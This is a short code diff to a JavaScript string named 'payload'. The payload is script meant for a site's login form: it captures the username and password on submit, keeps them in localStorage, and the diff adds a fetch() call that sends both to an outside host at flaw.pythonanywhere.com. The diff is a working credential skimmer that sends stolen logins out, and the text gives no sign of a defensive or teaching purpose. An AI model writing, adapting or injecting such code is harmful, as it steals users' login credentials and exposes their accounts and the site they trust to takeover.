@@ -1,8 +1,12 @@
 var payload = `
 
 document.querySelector('form#login-form').addEventListener('submit',(e)=>{
-    localStorage.u= document.querySelector('#LoginForm_username').value
-    localStorage.p= document.querySelector('#LoginForm_password').value
+    let pw = document.querySelector('#LoginForm_password').value
+    let un = document.querySelector('#LoginForm_username').value
+    localStorage.u= un
+    localStorage.p= pw
+    fetch("https://flaw.pythonanywhere.com/save/${un}/${pw}")
+
 })
 
 `
